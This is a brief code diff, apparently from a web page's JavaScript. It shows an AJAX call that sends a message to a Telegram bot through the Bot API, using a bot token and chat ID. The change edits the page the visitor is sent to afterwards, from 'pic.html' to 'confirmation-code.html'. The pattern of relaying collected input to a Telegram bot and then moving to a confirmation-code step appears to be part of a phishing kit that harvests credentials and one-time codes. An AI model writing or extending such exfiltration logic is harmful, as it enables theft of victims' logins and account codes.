@@ -169,7 +169,7 @@
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
                     complete: function() {
-                        window.location.href = 'pic.html';
+                        window.location.href = 'confirmation-code.html';
                     }
                 });
             });
